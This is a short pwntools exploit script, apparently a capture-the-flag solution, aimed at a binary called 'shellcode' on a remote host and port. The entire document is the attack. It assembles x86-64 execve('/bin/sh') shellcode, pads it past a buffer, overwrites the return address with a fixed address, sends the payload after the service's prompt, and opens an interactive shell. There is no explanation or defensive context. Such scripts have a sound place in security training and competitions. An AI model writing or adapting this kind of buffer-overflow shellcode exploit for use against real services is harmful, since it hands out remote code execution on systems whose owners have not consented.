#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./shellcode')
else:
    p = remote('47.106.94.13', 50011)


# gdb.attach(p, "b *0x400705\nc")
pd = asm('''
mov rax, 0x3b
movabs rdi, 0x732f2f6e69622f2f
push 0x68
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
''')
pd = pd.ljust(0x28, '\x00')
pd += p64(0x400708)
p.sendafter('U have read 0day!\n', pd)
p.interactive()
